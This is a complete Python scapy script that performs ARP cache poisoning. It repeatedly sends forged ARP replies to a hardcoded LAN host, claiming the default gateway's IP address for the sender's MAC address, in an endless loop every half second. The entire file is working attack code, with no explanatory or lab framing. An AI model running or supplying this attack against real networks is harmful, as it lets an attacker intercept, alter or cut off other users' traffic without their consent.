from scapy.all import *
import time


def ethernet(targetIP):
    eth = Ether()
    eth.dst = getmacbyip(targetIP)
    eth.type = 0x0806
    return eth


def arpPacket(targetIP):
    arp = ARP()
    arp.hwlen = 6
    arp.plen = 4
    arp.op = 2
    arp.psrc = conf.route.route()[2]
    arp.hwdst = getmacbyip(targetIP)
    arp.pdst = targetIP
    return arp


def sendPacket(targetIP):
    eth = ethernet(targetIP)
    arp = arpPacket(targetIP)
    packet = eth / arp
    sendp(packet)


if __name__ == '__main__':
    targetIP = "192.168.137.240"
    while True:
        sendPacket(targetIP)
        time.sleep(0.5)

